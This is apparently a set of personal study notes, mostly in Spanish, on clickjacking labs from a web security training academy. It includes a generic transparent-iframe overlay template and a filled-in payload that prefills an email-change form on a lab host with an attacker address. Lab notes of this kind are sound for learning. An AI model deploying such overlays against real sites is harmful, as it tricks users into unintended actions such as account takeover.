# Clickjacking

## Basic clickjacking with CSRF token protection

Un iframe permite cargar una pagina encima de otra de aqui proviene esta vulnerabilidad que se engaña al usuario a que haga clic en 
un lugar donde no deberia haciendo el iframe trasparente. SOlo funciona si las paginas permiten iframes si los iframe are allow( frame en ingles els cuadro marco)

```
<style>
    iframe {
        position:relative;
        width:$width_value;
        height: $height_value;
        opacity: $opacity;
        z-index: 2;
    }
    div {
        position:absolute;
        top:$top_value;
        left:$side_value;
        z-index: 1;
    }
</style>
<div>Test me</div>
<iframe src="AQUI PON LA URL LA CUAL SE VA PONER ENSIMA EL DIV></iframe>

```
## Clickjacking with form input data prefilled from a URL parameter

Es basicamente lo mismo del ejemplo pero  cargando datos para cambiar el email 

```
<style>
    iframe {
        position:relative;
        width:700px;
        height: 700px;
        opacity: 0.0001;
        z-index: 2;
    }
    div {
        position:absolute;
        top:450px;
        left:60px;
        z-index: 1;
    }
</style>
<div>CLICK ME</div>
<iframe src="https://0a96006303e0a89fc01f20c700340002.web-security-academy.net/my-account/?email=hacker@attacker-website.com"></iframe>
```
